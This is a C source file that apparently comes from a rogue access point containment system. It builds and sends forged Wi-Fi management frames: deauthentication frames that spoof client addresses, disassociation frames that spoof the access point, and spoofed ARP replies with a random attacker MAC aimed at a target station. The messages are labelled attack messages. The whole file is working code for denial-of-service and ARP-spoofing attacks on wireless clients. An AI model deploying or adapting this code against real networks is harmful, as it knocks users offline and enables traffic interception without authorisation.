/******************************************************************************
  File Name    : wireless.c
  Author       : zhaoej
  Date         : 20160218
  Description  : wireless packet interface,assemble packets 
******************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <endian.h>
#include "rogue_utils.h"
#include "wireless_header.h"

//assemble arp
unsigned char attack_mac[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55};
unsigned char attack_ip[4] = {192,168,1,0};


//get attack mac address
void genrand(unsigned char *buf, int count)
{
	int i;
	srand(time(0));

	for(i = 0; i < count; i++)
		buf[i] = rand()%128;
}

void iprand(unsigned char *buf,int count){
	
	if(count%2==0 || count==0){
		buf[0]=254;
	}else{
		buf[0]=1;
	}
	
}


int assemble_arp(char *buf, P_RGSTA_LIST ni,int count)
{

	struct ieee80211_frame *wh;
	struct llc *llc;
	ARPHDR *arph;
	u_int8_t *frm;
	u_int8_t type;
	int frmlen= 0;
	u_int16_t qos = 0;
	
	genrand(&attack_mac[1], 5);
	wh =(struct ieee80211_frame *)buf;
		if(NULL == wh){
		return FALSE;
	}
	frmlen += sizeof(struct ieee80211_frame); 
	if(ni->qos){
		type = IEEE80211_FC_TYPE_DATA |IEEE80211_FC_SUBTYPE_QOS;
	}else{
		type = IEEE80211_FC_TYPE_DATA;
	}
	
	wh->i_fc[0] = IEEE80211_FC_VERSION_0 | type;
	//wh->i_fc[1] = IEEE80211_FC1_DIR_FROMDS;
	memcpy(wh->i_addr1, ni->stamac, 6);
	memcpy(wh->i_addr2, ni->apmac, 6);
	memcpy(wh->i_addr3,  ni->apmac, 6);

	*(u_int16_t *)&wh->i_dur[0] = 0;
	*(u_int16_t *)&wh->i_seq[0] = 0;//xxxx
	frm = (u_int8_t *)&wh[1];
	if(ni->qos){
		*(u_int16_t *)frm = htons(qos);
		frmlen += 2;
		llc =(struct llc *)(buf + sizeof(struct ieee80211_frame)+QOS_LEN);
		arph=(ARPHDR *)(buf + sizeof(struct ieee80211_frame)+ QOS_LEN +sizeof(struct llc));
	}
	else{
		
		llc =(struct llc *)(buf + sizeof(struct ieee80211_frame));
		arph=(ARPHDR *)(buf + sizeof(struct ieee80211_frame) +sizeof(struct llc));
	}
	
	llc->llc_dsap = llc->llc_ssap = LLC_SNAP_LSAP;
	llc->llc_control = LLC_UI;
	llc->llc_snap.org_code[0] = RFC1042_SNAP_ORGCODE_0; /* 0x0 */
	llc->llc_snap.org_code[1] = RFC1042_SNAP_ORGCODE_1; /* 0x0 */
	llc->llc_snap.org_code[2] = RFC1042_SNAP_ORGCODE_2; /* 0x0 */
	llc->llc_snap.ether_type = htons(EPT_ARP);
	frmlen += 8;
	
	arph->arp_hdr = htons(ARPHRD_ETHER);
	arph->arp_pro =htons( EPT_IP);
	arph->arp_hln = ARP_HDR_LEN;
	arph->arp_pln = ARP_PRO_LEN;
	arph->arp_op  = htons(ARP_REPLY);
	memcpy(attack_ip,ni->ipaddr,3);
	iprand(&attack_ip[3], count);
	memcpy(arph->arp_sha, attack_mac, 6);
	memcpy(arph->arp_spa, attack_ip, 4);

	memcpy(arph->arp_tha, ni->stamac, 6);
	memcpy(arph->arp_tpa, ni->ipaddr, 4);
	frmlen += sizeof(ARPHDR);
	
	return frmlen;
} 

/*
 * Send a deauth frame
 */
int assemble_deauth(P_RGSTA_LIST ni,char *buf, u_int16_t reason){
	
	u_int8_t *frm;
	u_int8_t type;
	int frmlen = 0;
	struct ieee80211_frame *wh;
	wh = (struct ieee80211_frame *)buf;
	
	if(NULL == wh){
		return FALSE;
	}
	frmlen += sizeof(struct ieee80211_frame); 
	type = IEEE80211_FC_TYPE_MGT | IEEE80211_FC_SUBTYPE_DEAUTH;
	wh->i_fc[0] = IEEE80211_FC_VERSION_0 | type;
	//wh->i_fc[1] = IEEE80211_FC1_DIR_FROMDS;
	//memcpy(wh->i_addr1, ni->stamac, 6);
	//memcpy(wh->i_addr2, ni->apmac, 6);
	memcpy(wh->i_addr1,  ni->apmac, 6);
	memcpy(wh->i_addr2,  ni->stamac, 6);
	memcpy(wh->i_addr3,  ni->apmac, 6);

	*(u_int16_t *)&wh->i_dur[0] = 0;
	*(u_int16_t *)&wh->i_seq[0] = 0;
	frm = (u_int8_t *)&wh[1];
	*(u_int16_t *)frm = htole16(reason);
	frmlen += 2;
	//netlink send packet
	return frmlen;
}

/*
 * Send a disassoc frame
 */
int assemble_disassoc(P_RGSTA_LIST ni,char *buf, u_int16_t reason){
	struct ieee80211_frame *wh;
	u_int8_t *frm;
	u_int8_t type;
	int frmlen = 0;
	wh = (struct ieee80211_frame *)buf;
	if(NULL == buf){
		return FALSE;
	}
	frmlen += sizeof(struct ieee80211_frame);
	type = IEEE80211_FC_TYPE_MGT | IEEE80211_FC_SUBTYPE_DISASSOC;
	wh->i_fc[0] = IEEE80211_FC_VERSION_0 | type;
	//wh->i_fc[1] = IEEE80211_FC1_DIR_FROMDS;
	memcpy(wh->i_addr1, ni->stamac, 6);
	memcpy(wh->i_addr2, ni->apmac, 6);
	memcpy(wh->i_addr3, ni->apmac, 6);

	*(u_int16_t *)&wh->i_dur[0] = 0;
	*(u_int16_t *)&wh->i_seq[0] = 1;
	frm = (u_int8_t *)&wh[1];
	*(u_int16_t *)frm = htole16(reason);
	frmlen += 2;
	//netlink send packet
	return frmlen;
}

Bool rg_nl_send_arp(P_RGSTA_LIST ni,unsigned char channel,int count){

	char * buf;
	int arplen,ret=0;
	int hoffset = 0;
	int buflen = 0;
	struct protocolAttack *attack = NULL;
	elementmsg elemsg;
	elemsg.msg = NULL;
	buf = malloc(sizeof(struct ieee80211_frame)+ QOS_LEN +sizeof(struct llc)+ sizeof(ARPHDR)+ATTACK_PACKET_HEAD);
	printf("llc=%d\n",sizeof(struct llc));
	memset(buf, 0,sizeof(struct ieee80211_frame)+ QOS_LEN +sizeof(struct llc)+ sizeof(ARPHDR)+ATTACK_PACKET_HEAD);
	if(NULL == buf){
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"ARP packet malloc memory failed!");
		rogue_debug_error("[ROGUEAP]: ARP packet malloc memory failed!");
		return FALSE;
	}
	arplen = assemble_arp(buf+ATTACK_PACKET_HEAD,ni,count);
	
	attack =(struct protocolAttack *)buf;
	attack->MsgType = ROGUE_MSG_TYPE_VALUE_ATTACK_MESSAGE;
	attack->MsgLen  = 5+arplen;
	hoffset = sizeof(struct protocolAttack);
	elemsg.msg =(unsigned char *)(buf + hoffset);
	elemsg.offset = 0;
	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_CHANNEL);
	ProtocolStore8(&elemsg,1);
	ProtocolStore8(&elemsg,channel);

	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_ARP);
	ProtocolStore8(&elemsg,arplen);
	buflen = arplen + ATTACK_PACKET_HEAD;
	if(!(ret = nl_send_msg(buf,buflen))){	
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"send arp packet error!");
		rogue_debug_error("[ROGUEAP]: send ARP packet error");
		free(buf);
		return FALSE;
	}
	free(buf);
	return TRUE;

}

Bool rg_nl_send_deauth(P_RGSTA_LIST ni,unsigned char channel){

	u_int16_t reason;
	int buflen,ret = 0,len = 0;
	char * buf;
	int hoffset = 0;
	struct protocolAttack *attack = NULL;
	elementmsg elemsg;
	elemsg.msg = NULL;
	
	buf  = malloc(sizeof(struct ieee80211_frame)+2+ATTACK_PACKET_HEAD);
	memset(buf, 0,sizeof(struct ieee80211_frame)+2+ATTACK_PACKET_HEAD);
	if(NULL == buf){
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"Deauth packet malloc memory failed!");
		rogue_debug_error("[ROGUEAP]: Deauth packet malloc memory failed!");
		return FALSE;
	}
	reason =(u_int16_t)IEEE80211_REASON_AUTH_EXPIRE;
	len = assemble_deauth(ni,buf+ATTACK_PACKET_HEAD, reason);
	attack =(struct protocolAttack *)buf;
	attack->MsgType = ROGUE_MSG_TYPE_VALUE_ATTACK_MESSAGE;
	attack->MsgLen  = 5+len;
	hoffset = sizeof(struct protocolAttack);
	elemsg.msg =(unsigned char *)(buf + hoffset);
	elemsg.offset = 0;
	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_CHANNEL);
	ProtocolStore8(&elemsg,1);
	ProtocolStore8(&elemsg,channel);

	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_DEAUTH);
	ProtocolStore8(&elemsg,len);
	buflen = len + ATTACK_PACKET_HEAD;
	if(!(ret = nl_send_msg(buf,buflen))){
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"send deauth packet error!");
		rogue_debug_error("[ROGUEAP]: send deauth packet error");
		free(buf);
		return FALSE;
	}
	free(buf);
	return TRUE;
}

Bool rg_nl_send_disassoc(P_RGSTA_LIST ni,unsigned char channel){

	u_int16_t reason;
	int buflen, ret = 0,len = 0;
	char *buf;

	int hoffset = 0;
	struct protocolAttack *attack = NULL;
	elementmsg elemsg;
	elemsg.msg = NULL;
	
	buf = malloc(sizeof(struct ieee80211_frame)+2+ATTACK_PACKET_HEAD);
	memset(buf, 0,sizeof(struct ieee80211_frame)+2+ATTACK_PACKET_HEAD);
	if(NULL == buf){
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"Disassoc packet malloc memory failed!");
		rogue_debug_error("[ROGUEAP]: Disassoc packet malloc memory failed!");
		return FALSE;
	}
	reason = (u_int16_t)IEEE80211_REASON_ASSOC_LEAVE;
	len = assemble_disassoc(ni, buf+ATTACK_PACKET_HEAD, reason);


	attack =(struct protocolAttack *)buf;
	attack->MsgType = ROGUE_MSG_TYPE_VALUE_ATTACK_MESSAGE;
	attack->MsgLen  = 5+len;
	hoffset = sizeof(struct protocolAttack);
	elemsg.msg =(unsigned char *)(buf + hoffset);
	elemsg.offset = 0;
	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_CHANNEL);
	ProtocolStore8(&elemsg,1);
	ProtocolStore8(&elemsg,channel);

	ProtocolStore8(&elemsg,ROGUE_MSG_ELEMENT_TYPE_DISASSOC);
	ProtocolStore8(&elemsg,len);
	buflen = len + ATTACK_PACKET_HEAD;
	
	if(!(ret = nl_send_msg(buf,buflen))){
		rogue_debug(MODULE_DRIVER, ROGUEAP_LOG_LEVEL_ERR,"send disassoc packet error!");
		rogue_debug_error("[ROGUEAP]: send disassoc packet error");
		free(buf);
		return FALSE;
	}
	free(buf);
	return TRUE;
}
